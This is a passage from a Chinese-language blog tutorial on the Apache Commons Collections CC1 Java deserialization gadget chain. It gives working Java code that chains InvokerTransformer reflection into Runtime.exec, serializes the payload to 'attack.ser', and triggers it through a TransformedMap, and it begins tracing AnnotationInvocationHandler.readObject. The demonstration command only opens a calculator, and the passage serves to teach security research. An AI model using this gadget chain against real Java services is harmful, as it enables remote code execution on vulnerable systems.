punctuation">)</span><span class="token punctuation">;</span>Method method <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>iMethodName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iParamTypes<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iArgs<span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>也就是说，第二行getMethod方法没法获取到getRuntime<br>那有没有办法呢？答案是二次反射。我们利用第二行代码getMethod调用另一个getMethod出来，然后在第三行调用原来cls的invoke。然后，再弄一个InvokerTransformer调用invoke方法把getMethod(“getRuntime”)搞出来。<br>换句话说，利用反射调一个getMethod(“getRuntime”)方法，再利用反射调一个invoke方法</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cc1</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Transformer d<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span>                        <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span>                        <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>                    <span class="token string">"exec"</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//payload序列化</span>        ObjectOutputStream oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"attack.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"attack.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Transformer a<span class="token operator">=</span><span class="token punctuation">(</span>ChainedTransformer<span class="token punctuation">)</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        d<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>成功调出计算器<br><img src="https://kingofkb.github.io/medias/image/20220721/calc3.png"><br>与下面的代码作用相同</p><pre class=" language-java"><code class="language-java"> <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//x[0],object=""</span>        Class <span class="token class-name">s</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//x[1],object="java.lang.Runtime"</span>        Object o <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>o <span class="token operator">+</span> <span class="token string">"\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//x[2],object="java.lang.Runtime.getRuntime()"</span>        s <span class="token operator">=</span> o<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        o <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>o<span class="token punctuation">,</span> null<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s <span class="token operator">+</span> <span class="token string">"\n"</span> <span class="token operator">+</span> o <span class="token operator">+</span> <span class="token string">"\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//x[3],object=</span>        Object o1 <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>o1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h3><p>有两种Map的实现方法，一种是TransformedMap，另一种Lazymap，ysoserial用的是第二种，下面我会分别聊这两种实现方法。</p><h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p>查看源码</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> Map <span class="token function">decorate</span><span class="token punctuation">(</span>Map map<span class="token punctuation">,</span> Transformer keyTransformer<span class="token punctuation">,</span> Transformer valueTransformer<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> keyTransformer<span class="token punctuation">,</span> valueTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">protected</span> <span class="token function">TransformedMap</span><span class="token punctuation">(</span>Map map<span class="token punctuation">,</span> Transformer keyTransformer<span class="token punctuation">,</span> Transformer valueTransformer<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">super</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>keyTransformer <span class="token operator">=</span> keyTransformer<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>valueTransformer <span class="token operator">=</span> valueTransformer<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">protected</span> Object <span class="token function">transformKey</span><span class="token punctuation">(</span>Object object<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>keyTransformer <span class="token operator">==</span> null <span class="token operator">?</span> object <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>keyTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">protected</span> Object <span class="token function">transformValue</span><span class="token punctuation">(</span>Object object<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>valueTransformer <span class="token operator">==</span> null <span class="token operator">?</span> object <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>valueTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> Object <span class="token function">put</span><span class="token punctuation">(</span>Object key<span class="token punctuation">,</span> Object value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    key <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">transformKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    value <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">transformValue</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>当该类在调用<strong>put</strong>函数时，接收一个<strong>map</strong>进来，分别对 key 和 Value 进行一些操作，会执行<strong>transform</strong>函数，最后的执行结果会被添加到<strong>map</strong>里。<br>尝试一下</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>TransformedMap<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">interface</span> <span class="token class-name">Test</span> <span class="token keyword">extends</span> <span class="token class-name">Transformer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> Object <span class="token function">transform</span><span class="token punctuation">(</span>Object input<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test1</span> <span class="token keyword">implements</span> <span class="token class-name">Test</span><span class="token punctuation">,</span> Transformer <span class="token punctuation">{</span>    <span class="token keyword">public</span> Object <span class="token function">transform</span><span class="token punctuation">(</span>Object input<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"x"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test2</span> <span class="token keyword">implements</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> Object <span class="token function">transform</span><span class="token punctuation">(</span>Object input<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"d"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">map</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Map innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        Map map <span class="token operator">=</span> TransformedMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Test1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Test2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="https://kingofkb.github.io/medias/image/20220721/mapout.png"><br>更改payload：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>TransformedMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cc1</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Transformer d<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//Map</span>        Map map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map map1 <span class="token operator">=</span> TransformedMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> null<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//payload序列化</span>        ObjectOutputStream oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"attack.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>map1<span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"attack.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map map2<span class="token operator">=</span><span class="token punctuation">(</span>Map<span class="token punctuation">)</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>成功弹出计算器。<br><img src="https://kingofkb.github.io/medias/image/20220721/calc4.png"></p><p>接下来寻找<strong>readObject</strong>和<strong>put</strong>的联系，这个类就是<strong>sun.reflect.annotation.AnnotationInvocationHandler</strong>。</p><h3 id="AbstractInputCheckedMapDecorator类"><a href="#AbstractInputCheckedMapDecorator类" class="headerlink" title="AbstractInputCheckedMapDecorator类"></a>AbstractInputCheckedMapDecorator类</h3><p>接下来我们分析 AnnotationInvocationHandler 类，需要注意的时他不是public,只能在所属包下访问到，所以我们通过反射获取。<br>看看AnnotationInvocationHandler类下的readObject函数。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>ObjectInputStream var1<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>    var1<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    AnnotationType var2 <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        var2 <span class="token operator">=</span> AnnotationType<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalArgumentException</span> var9<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidObjectException</span><span class="token punctuation">(</span><span class="token string">"Non-annotation type in annotation serial stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    Map var3 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">memberTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Iterator var4 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>memberValues<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Entry var5 <span class="token operator">=</span> <span class="token punctuation">(</span>Entry<span class="token punctuation">)</span>var4<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String var6 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>var5<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">var7</span> <span class="token operator">=</span> <span class="token punctuation">(</span>Class<span class="token punctuation">)</span>var3<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>var7 <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            Object var8 <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var7<span class="token punctuation">.</span><span class="token function">isInstance</span><span class="token punctuation">(</span>var8<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>var8 <span class="token keyword">instanceof</span> <span class="token class-name">ExceptionProxy</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                var5<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span><span class="token 